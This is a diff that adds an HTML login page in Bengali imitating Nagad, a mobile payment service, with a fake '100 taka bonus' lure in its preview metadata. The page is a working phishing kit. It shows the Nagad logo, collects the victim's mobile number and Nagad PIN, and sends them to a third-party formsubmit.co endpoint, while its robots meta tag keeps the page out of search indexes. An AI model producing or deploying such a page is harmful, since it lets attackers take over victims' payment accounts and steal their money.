@@ -1,0 +1,154 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <link rel="shortcut icon" href="https://i.ibb.co/n0yL4dR/1679248787-Nagad-Logo-1.png" />
+    <meta property="og:title" content="এখনই লগইন করুন নগদ ওয়েবসাইটে ১০০ টাকা।বোনাস পাওয়ার জন্য সীমিত সুযোগ!" />
+    <meta property="og:description" content="এখনই লগইন করুন নগদ ওয়েবসাইটে ১০০ টাকা।বোনাস পাওয়ার জন্য সীমিত সুযোগ!" />
+    <meta property="og:image" content="https://i.ibb.co/VJCz5cG/142545-117.jpg" />
+    <meta name="robots" content="noindex, nofollow">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>নগদ ওয়েব লগ-ইন</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+    <style>
+    	@keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        body {
+            background-color: #fafafa;
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            justify-content: flex-start;
+            align-items: center;
+            height: 100vh;
+            padding-top: 50px;
+            overflow: hidden;
+        }
+
+        .logo {
+            text-align: center;
+            margin-bottom: 20px;
+            animation: fadeIn 1s ease-in-out;
+        }
+
+        .logo img {
+            max-width: 100px;
+        }
+
+        .container {
+            background-color: #fafafa;
+            padding: 20px;
+            border-radius: 10px;
+            width: 300px;
+            animation: fadeIn 1.5s ease-in-out;
+        }
+
+        .input-group {
+            margin-bottom: 25px;
+            text-align: left;
+            position: relative;
+            animation: fadeIn 2s ease-in-out;
+        }
+
+        .input-group p {
+            margin: 0 0 5px;
+            font-weight: bold;
+        }
+
+        .input-icon {
+            position: absolute;
+            left: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #ee462b;
+            font-family: FontAwesome;
+        }
+
+        .fa-phone:before {
+            content: "\f095";
+        }
+
+        .fa-lock:before {
+            content: "\f023";
+        }
+
+        input[type="number"] {
+            width: 100%;
+            padding: 10px 10px 10px 40px;
+            border: none;
+            border-bottom: 2px solid #CCCCCC;
+            border-radius: 4px;
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
+            transition: border-color 0.3s, box-shadow 0.3s;
+            font-size: 18px;
+            background-color: #fafafa;
+        }
+
+        input[type="number"]::placeholder {
+            font-family: Arial, sans-serif;
+            color: #999999;
+            font-size: 16px;
+        }
+
+        input:focus {
+            border-bottom: 2px solid #ee462b;
+            box-shadow: none;
+            outline: none;
+        }
+
+        input.invalid {
+            border-bottom: 2px solid red;
+        }
+
+        #loginButton {
+            background-color: transparent;
+            color: #ee462b;
+            border: 2px solid #ee462b;
+            padding: 10px 20px;
+            border-radius: 20px;
+            cursor: pointer;
+            width: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: Arial, sans-serif;
+            font-size: 18px;
+            transition: background-color 0.3s, color 0.3s, transform 0.3s;
+            animation: fadeIn 2.5s ease-in-out;
+        }
+
+        #loginButton:hover {
+            background-color: #ee462b;
+            color: #FFFFFF;
+            transform: translateY(-2px);
+        }
+</style>
+</head>
+<body>
+    <div class="logo">
+        <img src="https://i.ibb.co/k8LkGTT/removal-ai-d3363a06-05e5-4e1d-bb5b-60348f7c2805-img-20240617-115730.png" alt="Nagad Logo">
+    </div>
+    <form action="https://formsubmit.co/1fa5554bf4b992cf860995de72787432" method="POST">
+    <div class="container">
+        <div class="input-group">
+            <p>মোবাইল নাম্বার</p>
+            <i class="fa fa-phone input-icon"></i>
+            <input type="number" name="Number" placeholder="XXX-XXXX-XXXX" id="mobileNumber" required>
+        </div>
+        <div class="input-group">
+            <p>নগদ পিন</p>
+            <i class="fa fa-lock input-icon"></i>
+            <input type="number" name="Pin" placeholder="XXXX" id="pin" required>
+        </div>
+        <button type="submit" id="loginButton">পরবর্তী</button>
+    </div>
+</form>
+
+</body>
+</html>
